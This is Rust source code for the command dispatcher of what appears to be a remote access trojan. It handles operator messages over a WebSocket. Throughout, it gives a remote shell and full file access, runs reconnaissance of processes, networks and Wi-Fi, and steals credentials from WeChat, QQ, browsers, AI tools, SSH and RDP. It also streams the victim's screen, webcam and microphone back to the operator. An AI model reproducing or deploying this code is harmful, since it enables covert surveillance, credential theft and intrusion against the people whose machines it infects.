use libra_common::protocol::{WebSocketMessage, ws_type};
use libra_comm::ws::WsSender;
use libra_platform::get_executor;

use super::AgentEngine;
use super::shell::{ShellSession, bind_shell, handle_shell_input, unbind_shell};
use super::streams::{start_camera_stream, start_screen_stream};
use super::utils::{blocking_string, blocking_val, data_str, data_u64, run_module, ws_send};

impl AgentEngine {
    // ── WS message dispatch ──────────────────────────────────────────

    pub(crate) async fn handle_ws_message(
        &mut self,
        msg: WebSocketMessage,
        tx: &WsSender,
        shell_tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
        shell_session: &mut Option<ShellSession>,
        module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
    ) {
        let agent_id = self.agent_id.clone();
        let msg_type = msg.msg_type.clone();
        let data = msg.data.clone();
        let rid = msg.request_id.clone();
        let rid = rid.as_deref();

        match msg_type.as_str() {
            // ── Shell ────────────────────────────────────────────
            ws_type::SHELL_BIND => {
                bind_shell(&agent_id, tx, shell_tx, shell_session, &data, rid).await;
            }
            ws_type::SHELL_UNBIND => {
                unbind_shell(&agent_id, tx, shell_session, rid).await;
            }
            ws_type::SHELL_INPUT => {
                handle_shell_input(shell_session, &data, shell_tx, &agent_id).await;
            }

            // ── File operations (cloud module) ────────────────────
            ws_type::FILE_DRIVES => {
                let drives = blocking_val(|| {
                    let executor = get_executor();
                    executor.get_drives()
                }).await;
                let escaped: Vec<String> = drives.iter()
                    .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                    .collect();
                let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
                ws_send(tx, &agent_id, "file.drives.result", &json, rid).await;
            }
            ws_type::FILE_LIST => {
                let path = data_str(&data, "path", ".");
                let offset = data_u64(&data, "offset", 0) as usize;
                let limit = data_u64(&data, "limit", 200) as usize;
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "list", "path": path, "offset": offset, "limit": limit
                })).await;
                ws_send(tx, &agent_id, "file.list.result", &r, rid).await;
            }
            ws_type::FILE_READ => {
                let path = data_str(&data, "path", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "read", "path": path
                })).await;
                ws_send(tx, &agent_id, "file.read.result", &r, rid).await;
            }
            ws_type::FILE_DOWNLOAD => {
                let path = data_str(&data, "path", "");
                let offset = data_u64(&data, "offset", 0);
                let chunk_size = data_u64(&data, "chunkSize", 2 * 1024 * 1024);
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "download", "path": path, "offset": offset, "chunkSize": chunk_size
                })).await;
                ws_send(tx, &agent_id, "file.download.result", &r, rid).await;
            }
            ws_type::FILE_OPEN => {
                let path = data_str(&data, "path", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "open", "path": path
                })).await;
                ws_send(tx, &agent_id, "file.open.result", &r, rid).await;
            }
            ws_type::FILE_WRITE => {
                let path = data_str(&data, "path", "");
                let content = data_str(&data, "data", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "write", "path": path, "data": content
                })).await;
                ws_send(tx, &agent_id, "file.write.result", &r, rid).await;
            }
            ws_type::FILE_DELETE => {
                let path = data_str(&data, "path", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "delete", "path": path
                })).await;
                ws_send(tx, &agent_id, "file.delete.result", &r, rid).await;
            }
            ws_type::FILE_MKDIR => {
                let path = data_str(&data, "path", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "mkdir", "path": path
                })).await;
                ws_send(tx, &agent_id, "file.mkdir.result", &r, rid).await;
            }
            ws_type::FILE_RENAME => {
                let path = data_str(&data, "path", "");
                let new_name = data_str(&data, "newName", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "rename", "path": path, "newName": new_name
                })).await;
                ws_send(tx, &agent_id, "file.rename.result", &r, rid).await;
            }
            ws_type::FILE_MOVE => {
                let src = data_str(&data, "source", "");
                let dst = data_str(&data, "destination", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "move", "path": src, "destination": dst
                })).await;
                ws_send(tx, &agent_id, "file.move.result", &r, rid).await;
            }
            ws_type::FILE_COPY => {
                let src = data_str(&data, "source", "");
                let dst = data_str(&data, "destination", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "copy", "path": src, "destination": dst
                })).await;
                ws_send(tx, &agent_id, "file.copy.result", &r, rid).await;
            }
            ws_type::FILE_COMPRESS => {
                let path = data_str(&data, "path", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "compress", "path": path
                })).await;
                ws_send(tx, &agent_id, "file.compress.result", &r, rid).await;
            }
            ws_type::FILE_DECOMPRESS => {
                let path = data_str(&data, "path", "");
                let dest: Option<String> = data.as_ref()
                    .and_then(|d| d["destination"].as_str())
                    .map(|s| s.to_string());
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "decompress", "path": path, "destination": dest
                })).await;
                ws_send(tx, &agent_id, "file.decompress.result", &r, rid).await;
            }
            ws_type::FILE_SHORTCUT => {
                let path = data_str(&data, "path", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "shortcut", "path": path
                })).await;
                ws_send(tx, &agent_id, "file.shortcut.result", &r, rid).await;
            }
            ws_type::FILE_ARCHIVE_LIST => {
                let path = data_str(&data, "path", "");
                let r = run_module(module_manager, "files", serde_json::json!({
                    "op": "archive_list", "path": path
                })).await;
                ws_send(tx, &agent_id, "file.archive_list.result", &r, rid).await;
            }

            // ── System info (cloud recon module; network stays kernel-resident) ──
            ws_type::SYSTEM_PROCESSES => {
                let r = run_module(module_manager, "recon", serde_json::json!({
                    "op": "processes"
                })).await;
                ws_send(tx, &agent_id, "system.processes.result", &r, rid).await;
            }
            ws_type::SYSTEM_WINDOWS => {
                let r = run_module(module_manager, "recon", serde_json::json!({
                    "op": "windows"
                })).await;
                ws_send(tx, &agent_id, "system.windows.result", &r, rid).await;
            }
            ws_type::SYSTEM_ENV => {
                let r = run_module(module_manager, "recon", serde_json::json!({
                    "op": "env"
                })).await;
                ws_send(tx, &agent_id, "system.env.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK => {
                let r = libra_modules::recon::NetworkInfo::collect().await;
                ws_send(tx, &agent_id, "system.network.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK_WAN => {
                let r = libra_modules::recon::NetworkInfo::collect_wan_only().await;
                ws_send(tx, &agent_id, "system.network.wan.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK_WIFI => {
                let r = libra_modules::recon::NetworkInfo::collect_wifi_only();
                ws_send(tx, &agent_id, "system.network.wifi.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK_NEARBY => {
                let r = libra_modules::recon::NetworkInfo::collect_nearby_wifi_only();
                ws_send(tx, &agent_id, "system.network.nearby.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK_PROXY => {
                let r = libra_modules::recon::NetworkInfo::collect_proxy_only();
                ws_send(tx, &agent_id, "system.network.proxy.result", &r, rid).await;
            }
            ws_type::SYSTEM_LANSCAN => {
                let r = run_module(module_manager, "recon", serde_json::json!({
                    "op": "lanscan"
                })).await;
                ws_send(tx, &agent_id, "system.lanscan.result", &r, rid).await;
            }
            ws_type::SYSTEM_BLUETOOTH => {
                let r = run_module(module_manager, "recon", serde_json::json!({
                    "op": "bluetooth"
                })).await;
                ws_send(tx, &agent_id, "system.bluetooth.result", &r, rid).await;
            }

            // ── Other software (cloud creds module) ────────────────
            ws_type::OTHERSOFT_WECHAT => {
                let r = run_module(module_manager, "creds", serde_json::json!({
                    "op": "wechat"
                })).await;
                ws_send(tx, &agent_id, "othersoft.wechat.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_QQ => {
                let r = run_module(module_manager, "creds", serde_json::json!({
                    "op": "qq"
                })).await;
                ws_send(tx, &agent_id, "othersoft.qq.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_BROWSER => {
                let btype = data_str(&data, "type", "all");
                let offset = data_u64(&data, "offset", 0) as usize;
                let limit = data_u64(&data, "limit", 100) as usize;
                let r = run_module(module_manager, "creds", serde_json::json!({
                    "op": "browser", "type": btype, "offset": offset, "limit": limit
                })).await;
                ws_send(tx, &agent_id, "othersoft.browser.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_BROWSER_SEARCH => {
                let btype = data_str(&data, "type", "all");
                let keyword = data_str(&data, "keyword", "");
                let r = run_module(module_manager, "creds", serde_json::json!({
                    "op": "browser_search", "type": btype, "keyword": keyword
                })).await;
                ws_send(tx, &agent_id, "othersoft.browser.search.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_AI => {
                let r = run_module(module_manager, "creds", serde_json::json!({
                    "op": "ai"
                })).await;
                ws_send(tx, &agent_id, "othersoft.ai.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_SSH => {
                let r = run_module(module_manager, "creds", serde_json::json!({
                    "op": "ssh"
                })).await;
                ws_send(tx, &agent_id, "othersoft.ssh.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_RDP => {
                let r = run_module(module_manager, "creds", serde_json::json!({
                    "op": "rdp"
                })).await;
                ws_send(tx, &agent_id, "othersoft.rdp.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_QQ_CLIENTKEY => {
                let r = run_module(module_manager, "creds", serde_json::json!({
                    "op": "qq_clientkey"
                })).await;
                ws_send(tx, &agent_id, "othersoft.qq_clientkey.result", &r, rid).await;
            }

            // ── Proxy (cloud module) ─────────────────────────────
            ws_type::PROXY_FETCH => {
                let url = data_str(&data, "url", "");
                let method = data_str(&data, "method", "GET");
                let headers = data.as_ref().and_then(|d| d["headers"].as_str());
                let body = data.as_ref().and_then(|d| d["body"].as_str());
                let r = run_module(module_manager, "proxy", serde_json::json!({
                    "url": url, "method": method, "headers": headers, "body": body
                })).await;
                ws_send(tx, &agent_id, "proxy.fetch.result", &r, rid).await;
            }

            // ── Screen ─────────────────────────────────────────
            ws_type::SCREEN_LIST => {
                let r = libra_modules::execution::ScreenCapture::list_screens();
                ws_send(tx, &agent_id, "screen.list.result", &r, rid).await;
            }
            ws_type::SCREEN_BIND => {
                start_screen_stream(&self, data, agent_id.clone(), tx.clone()).await;
                ws_send(tx, &agent_id, "screen.bind.result", r#"{"status":"streaming"}"#, rid).await;
            }
            ws_type::SCREEN_UNBIND => {
                if let Some(tx) = self.screen_session.lock().unwrap().take() {
                    let _ = tx.send(true);
                }
                ws_send(tx, &agent_id, "screen.unbind.result", r#"{"status":"ok"}"#, rid).await;
            }
            ws_type::SCREEN_CONFIG => {
                start_screen_stream(&self, data, agent_id.clone(), tx.clone()).await;
            }
            ws_type::CAMERA_LIST => {
                let r = libra_modules::execution::CameraCapture::list_cameras();
                ws_send(tx, &agent_id, "camera.list.result", &r, rid).await;
            }
            ws_type::CAMERA_BIND | ws_type::CAMERA_CONFIG => {
                start_camera_stream(&self, data, agent_id.clone(), tx.clone(), rid).await;
            }
            ws_type::CAMERA_UNBIND => {
                if let Some(cancel) = self.camera_session.lock().unwrap().take() {
                    cancel.store(true, std::sync::atomic::Ordering::Relaxed);
                }
                ws_send(tx, &agent_id, "camera.unbind.result", r#"{"status":"ok"}"#, rid).await;
            }
            ws_type::MIC_LIST => {
                let r = libra_modules::execution::MicCapture::list_devices();
                ws_send(tx, &agent_id, "mic.list.result", &r, rid).await;
            }
            ws_type::MIC_BIND => {
                let idx = data_u64(&data, "deviceIndex", 0) as u32;
                let r = libra_modules::execution::MicCapture::start_capture(idx);
                ws_send(tx, &agent_id, "mic.data", &r, rid).await;
            }
            ws_type::MIC_UNBIND => {
                let r = libra_modules::execution::MicCapture::stop_capture();
                ws_send(tx, &agent_id, "mic.unbind.result", &r, rid).await;
            }

            _ => {} // Unknown type — ignore
        }
    }
}
